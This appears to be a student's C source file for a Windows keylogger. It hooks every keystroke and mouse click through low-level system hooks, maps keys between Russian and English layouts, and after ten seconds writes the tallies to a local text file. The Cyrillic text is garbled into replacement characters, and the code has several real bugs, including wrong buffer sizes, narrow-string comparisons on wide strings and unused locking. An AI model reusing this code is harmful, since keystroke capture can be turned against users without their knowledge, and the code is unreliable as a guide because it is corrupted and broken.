#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include "KeyLogStructs.h"

#define PATH L"X:\\2021-2022\\��������� ����������������\\�������\\��������� � ��������\\KeyLog.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 100500

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(WCHAR c);
VOID CountEverything(MAINLOG* lg);
MAINLOG* log;
CRITICAL_SECTION section = { 0 };

DWORD WINAPI KeyLogger() {
    InitializeCriticalSection(&section);
    log = calloc(1, sizeof(MAINLOG));
    log->prev = NULL;
    log->klog = calloc(1, sizeof(KLOG));
    log->mlog = calloc(1, sizeof(MLOG));
    log->klog->prev = NULL;
    log->mlog->prev = NULL;
    log->time = time(NULL);
    DeleteCriticalSection(&section);


    HHOOK keyBoardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
    HHOOK mouseHook = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyBoardHook);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}

DWORD WINAPI Timer() {
    time_t timeStart = time(NULL);
    time_t timeCheck = time(NULL);

    while (1) {
        timeCheck = time(NULL);
        if (timeCheck - timeStart >= 10) {
            CountEverything(log);
            log->next = calloc(1, sizeof(MAINLOG));
            log->next->prev = log;
            log = log->next;
            log->next = NULL;
            break;
        }
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow) {
    HANDLE KeyLogProject[2];
    KeyLogProject[0] = CreateThread(NULL, 0, Timer, NULL, 0, 0);
    KeyLogProject[1] = CreateThread(NULL, 0, KeyLogger, NULL, 0, 0);
    WaitForSingleObject(KeyLogProject[0], INFINITE);
    TerminateThread(KeyLogProject[1], 0);
}

BOOL IsCaps(void) {
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
        log->klog->KeyString = calloc(SIZE_STR + 2, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1) {
            swprintf(log->klog->KeyString, sizeof(log->klog->KeyString), L"[%s]", KeyString);
		}
		else {
			if (!IsCaps()) KeyString[0] = tolower(KeyString[0]);
			if (KeyLayout == ENG) {
                swprintf(log->klog->KeyString, sizeof(log->klog->KeyString), L"%s", KeyString);
			} if (KeyLayout == RUS) {
				KeyString[0] = EnToRus(KeyString[0]);
                swprintf(log->klog->KeyString, sizeof(log->klog->KeyString), L"%s", KeyString);
			}
		}
		free(KeyString);
        log->klog->next = calloc(1, sizeof(KLOG));
        log->klog->next->prev = log->klog;
        log->klog = log->klog->next;
        log->klog->next = NULL;
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam) {
    POINT point;
    GetCursorPos(&point);
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_MOUSEWHEEL) {
        log->mlog->mouseButton = wParam;
        log->mlog->mousePoint = point;
        log->mlog->next = calloc(1, sizeof(MLOG));
        log->mlog->next->prev = log->mlog;
        log->mlog = log->mlog->next;
        log->mlog->next = NULL;
    }
    return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr) {
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab")) {
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

WCHAR EnToRus(WCHAR c) {
    switch (c)
    {
    case ('q'): c = L'�'; break;
    case ('w'): c = L'�'; break;
    case ('e'): c = L'�'; break;
    case ('r'): c = L'�'; break;
    case ('t'): c = L'�'; break;
    case ('y'): c = L'�'; break;
    case ('u'): c = L'�'; break;
    case ('i'): c = L'�'; break;
    case ('o'): c = L'�'; break;
    case ('p'): c = L'�'; break;
    case ('['): c = L'�'; break;
    case (']'): c = L'�'; break;
    case ('a'): c = L'�'; break;
    case ('s'): c = L'�'; break;
    case ('d'): c = L'�'; break;
    case ('f'): c = L'�'; break;
    case ('g'): c = L'�'; break;
    case ('h'): c = L'�'; break;
    case ('j'): c = L'�'; break;
    case ('k'): c = L'�'; break;
    case ('l'): c = L'�'; break;
    case (';'): c = L'�'; break;
    case ('\''): c = L'�'; break;
    case ('z'): c = L'�'; break;
    case ('x'): c = L'�'; break;
    case ('c'): c = L'�'; break;
    case ('v'): c = L'�'; break;
    case ('b'): c = L'�'; break;
    case ('n'): c = L'�'; break;
    case ('m'): c = L'�'; break;
    case (','): c = L'�'; break;
    case ('/'): c = L'.'; break;
    case (' '): c = L' '; break;
    case ('`'): c = L'�'; break;
    case ('\\'): c = L'\\'; break;
    case ('@'): c = L'\"'; break;
    case ('#'): c = L'�'; break;
    case ('$'): c = L';'; break;
    case ('^'): c = L':'; break;
    case ('&'): c = L'?'; break;
    case ('|'): c = L'/'; break;
    case ('Q'): c = L'�'; break;
    case ('W'): c = L'�'; break;
    case ('E'): c = L'�'; break;
    case ('R'): c = L'�'; break;
    case ('T'): c = L'�'; break;
    case ('Y'): c = L'�'; break;
    case ('U'): c = L'�'; break;
    case ('I'): c = L'�'; break;
    case ('O'): c = L'�'; break;
    case ('P'): c = L'�'; break;
    case ('{'): c = L'�'; break;
    case ('}'): c = L'�'; break;
    case ('A'): c = L'�'; break;
    case ('S'): c = L'�'; break;
    case ('D'): c = L'�'; break;
    case ('F'): c = L'�'; break;
    case ('G'): c = L'�'; break;
    case ('H'): c = L'�'; break;
    case ('J'): c = L'�'; break;
    case ('K'): c = L'�'; break;
    case ('L'): c = L'�'; break;
    case (':'): c = L'�'; break;
    case ('"'): c = L'�'; break;
    case ('Z'): c = L'�'; break;
    case ('X'): c = L'�'; break;
    case ('C'): c = L'�'; break;
    case ('V'): c = L'�'; break;
    case ('B'): c = L'�'; break;
    case ('N'): c = L'�'; break;
    case ('M'): c = L'�'; break;
    case ('<'): c = L'�'; break;
    case ('>'): c = L'�'; break;
    case ('�'): c = L"q"; break;
    case ('�'): c = L"w"; break;
    case ('�'): c = L"e"; break;
    case ('�'): c = L"r"; break;
    case ('�'): c = L"t"; break;
    case ('�'): c = L"y"; break;
    case ('�'): c = L"u"; break;
    case ('�'): c = L"i"; break;
    case ('�'): c = L"o"; break;
    case ('�'): c = L"p"; break;
    case ('�'): c = L"["; break;
    case ('�'): c = L"]"; break;
    case ('�'): c = L"a"; break;
    case ('�'): c = L"s"; break;
    case ('�'): c = L"d"; break;
    case ('�'): c = L"f"; break;
    case ('�'): c = L"g"; break;
    case ('�'): c = L"h"; break;
    case ('�'): c = L"j"; break;
    case ('�'): c = L"k"; break;
    case ('�'): c = L"l"; break;
    case ('�'): c = L";"; break;
    case ('�'): c = L"'"; break;
    case ('�'): c = L"z"; break;
    case ('�'): c = L"x"; break;
    case ('�'): c = L"c"; break;
    case ('�'): c = L"v"; break;
    case ('�'): c = L"b"; break;
    case ('�'): c = L"n"; break;
    case ('�'): c = L"m"; break;
    case ('�'): c = L","; break;
    case ('�'): c = L"."; break;
    case ('.'): c = L"."; break;
    case ('�'): c = L"`"; break;
    case ('�'): c = L"#"; break;
    case ('?'): c = L","; break;
    case ('�'): c = L"Q"; break;
    case ('�'): c = L"W"; break;
    case ('�'): c = L"E"; break;
    case ('�'): c = L"R"; break;
    case ('�'): c = L"T"; break;
    case ('�'): c = L"Y"; break;
    case ('�'): c = L"U"; break;
    case ('�'): c = L"I"; break;
    case ('�'): c = L"O"; break;
    case ('�'): c = L"P"; break;
    case ('�'): c = L"{"; break;
    case ('�'): c = L"}"; break;
    case ('�'): c = L"A"; break;
    case ('�'): c = L"S"; break;
    case ('�'): c = L"D"; break;
    case ('�'): c = L"F"; break;
    case ('�'): c = L"G"; break;
    case ('�'): c = L"H"; break;
    case ('�'): c = L"J"; break;
    case ('�'): c = L"K"; break;
    case ('�'): c = L"L"; break;
    case ('�'): c = L":"; break;
    case ('�'): c = L"\""; break;
    case ('�'): c = L"Z"; break;
    case ('�'): c = L"X"; break;
    case ('�'): c = L"C"; break;
    case ('�'): c = L"V"; break;
    case ('�'): c = L"B"; break;
    case ('�'): c = L"N"; break;
    case ('�'): c = L"M"; break;
    case ('�'): c = L"<"; break;
    case ('�'): c = L">"; break;
    }
    return c;
}

VOID CountEverything(MAINLOG* lg) {
    InitializeCriticalSection(&section);
    MAINLOG* head = lg;
    STRNG* h1;
    STRNG* keyboard = calloc(1, sizeof(STRNG));
    keyboard->prev = NULL;
    KLOG* key = head->klog;
    BOOL counted = FALSE;
    while (key) {
        h1 = keyboard;
        while (h1) {
            if (h1->act) {
                if (key->KeyString && strcmp(h1->act, key->KeyString) == 0) {
                    h1->count++;
                    counted = TRUE;
                    break;
                }
            }
            h1 = h1->prev;
        }
        if (counted == FALSE) {
            keyboard->act = calloc(SIZE_STR + 1, sizeof(WCHAR));
            swprintf(keyboard->act, (SIZE_STR + 1) * sizeof(WCHAR), L"%s", key->KeyString);
            keyboard->count = 1;
            keyboard->next = calloc(1, sizeof(STRNG));
            keyboard->next->prev = keyboard;
            keyboard = keyboard->next;
        }
        if (key->prev)
            key = key->prev;
        else
            break;
        counted = FALSE;
    }
    MLOG* mkey = head->mlog;
    STRNG* mouse = calloc(1, sizeof(STRNG));
    mkey = mkey->prev;
    while (mkey) {
        h1 = mouse;
        LPWSTR KeyString = calloc(10500, sizeof(WCHAR));
        switch (mkey->mouseButton) {
        case WM_LBUTTONDOWN:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"LKM - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case WM_RBUTTONDOWN:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"PKM - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case WM_MBUTTONDOWN:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"SKM - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case WM_MOUSEHWHEEL:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"KOL - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case 522:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"KOL - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        default:
            KeyString = L"Oleg";
            break;
        }
        while (h1) {
            if (h1->act) {
                if (strcmp(h1->act, KeyString) == 0) {
                    h1->count++;
                    counted = TRUE;
                    break;
                }
            }
            h1 = h1->prev;
        }
        if (counted == FALSE) {
            mouse->act = calloc(10500, sizeof(WCHAR));
            swprintf(mouse->act, 10500 * sizeof(WCHAR), L"%s", KeyString);
            mouse->count = 1;
            mouse->next = calloc(1, sizeof(STRNG));
            mouse->next->prev = mouse;
            mouse = mouse->next;
        }
        if (mkey->prev)
            mkey = mkey->prev;
        else
            break;
        counted = FALSE;
        free(KeyString);
    }
    if (mouse->prev != NULL)
        mouse = mouse->prev;
    if (keyboard->prev != NULL)
        keyboard = keyboard->prev;
    mouse->next = NULL;
    keyboard->next = NULL;
    while (key->next) {
        free(key->prev);
        key = key->next;
    }
    while (mkey->next) {
        free(mkey->prev);
        mkey = mkey->next;
    }
    while (keyboard->prev) {
        keyboard = keyboard->prev;
    }
    while (mouse->prev) {
        mouse = mouse->prev;
    }
    WriteToFile(L"����������:\n");
    while (keyboard->next) {
        LPWSTR KeyString = calloc(100500, sizeof(WCHAR));
        swprintf(KeyString, 10500 * sizeof(WCHAR), L"%s - %d \t", keyboard->act, keyboard->count);
        WriteToFile(KeyString);
        keyboard = keyboard->next;
        free(KeyString);
    }
    WriteToFile(L"\n����:\n");
    while (mouse->next) {
        LPWSTR KeyString = calloc(100500, sizeof(WCHAR));
        swprintf(KeyString, 10500 * sizeof(WCHAR), L"%s - %d \t", mouse->act, mouse->count);
        WriteToFile(KeyString);
        mouse = mouse->next;
        free(KeyString);
    }
    WriteToFile(L"\n");
    while (mouse->prev) {
        mouse = mouse->prev;
        free(mouse->next);
    }
    while (keyboard->prev) {
        keyboard = keyboard->prev;
        free(keyboard->next);
    }
    DeleteCriticalSection(&section);
}

// Jktu